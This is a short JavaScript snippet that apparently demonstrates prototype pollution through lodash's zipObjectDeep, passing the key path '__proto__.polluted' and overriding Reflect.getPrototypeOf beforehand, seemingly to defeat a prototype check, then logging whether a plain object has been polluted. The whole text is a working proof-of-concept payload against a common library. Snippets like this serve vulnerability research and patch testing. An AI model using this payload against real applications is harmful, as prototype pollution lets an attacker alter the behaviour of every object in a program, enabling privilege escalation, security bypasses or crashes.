Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const _ = require('lodash');
_.zipObjectDeep(['__proto__.polluted'], ['yes']);
console.log({}.polluted);